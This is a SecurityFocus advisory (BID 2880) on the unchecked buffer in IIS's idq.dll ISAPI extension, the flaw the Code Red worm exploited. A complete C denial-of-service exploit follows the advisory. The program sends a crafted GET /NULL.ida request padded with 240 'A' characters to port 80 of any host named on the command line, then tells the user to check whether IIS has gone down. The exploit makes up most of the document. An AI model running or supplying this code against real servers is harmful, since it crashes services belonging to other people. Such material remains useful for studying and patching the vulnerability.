source: http://www.securityfocus.com/bid/2880/info

Windows Index Server ships with Windows NT 4.0 Option Pack; Windows Indexing Service ships with Windows 2000. An unchecked buffer resides in the 'idq.dll' ISAPI extension associated with each service. A maliciously crafted request could allow arbitrary code to run on the host in the Local System context.

Note that Index Server and Indexing Service do not need to be running for an attacker to exploit this issue. Since 'idq.dll' is installed by default when IIS is installed, IIS would need to be the only service running.

Note also that this vulnerability is currently being exploited by the 'Code Red' worm. In addition, all products that run affected versions of IIS are also vulnerable.

// DoS for isapi idq.dll unchecked buffer.
// For Testing Pruposes
// By Ps0 DtMF dot com dot ar

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

// #define DEBUG

int main(int argc, char *argv[])
{
   char mensaje[800];
   char *bof;
   int fd;
   struct sockaddr_in sin;
   struct hostent *rhost;

   if(argc<2) {
     fprintf(stderr,"Use : %s host\n",argv[0]);
     exit(0);
     }
   
   bzero(mensaje,strlen(mensaje));
   
   bof=(char *)malloc(240); // 240 segun eeye , si se le da mas NO anda
   
   memset(bof,'A',240);
  
   sprintf(mensaje,"GET /NULL.ida?%s=X HTTP/1.0\n\n",bof);
   
   
#ifdef DEBUG
   printf("\nMenssage : \n%s\n",mensaje);
#endif
   
   if ((rhost=gethostbyname(argv[1]))==NULL){
      printf("\nCan't find remote host %s \t E:%d\n",argv[1],h_errno);
      return -1;
   }

   sin.sin_family=AF_INET;
   sin.sin_port=htons(80);

   memcpy(&sin.sin_addr.s_addr, rhost->h_addr, rhost->h_length);

   fd = socket(AF_INET,SOCK_STREAM,6);

   if (connect(fd,(struct sockaddr *)&sin, sizeof(struct sockaddr))!=0){
      printf("\nCan't Connect to The host %s. May be down ? E:%s\n",argv[1],strerror(errno));
      return -1;
   }
   
   printf("Sending string........\n");
   
   if(send(fd,mensaje,strlen(mensaje),0)==-1){
      printf("\nError \n");
      return -1;
   }
   
   printf("\nString Sent... try telnet host 80 to check if IIS is down\n");
   
   close(fd);
   
   return 0;
 
}
   